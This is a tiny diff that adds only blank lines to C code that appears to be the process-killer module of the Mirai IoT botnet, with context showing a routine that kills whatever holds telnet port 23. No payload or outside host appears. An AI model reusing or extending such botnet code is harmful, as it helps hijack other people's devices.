@@ -13,6 +13,7 @@
 #include <fcntl.h>
 #include <time.h>
 
+
 #include "includes.h"
 #include "killer.h"
 #include "table.h"
@@ -41,6 +42,7 @@ void killer_init(void)
 #ifdef DEBUG
     printf("[killer] Trying to kill port 23\n");
 #endif
+	
     if (killer_kill_by_port(htons(23)))
     {
 #ifdef DEBUG
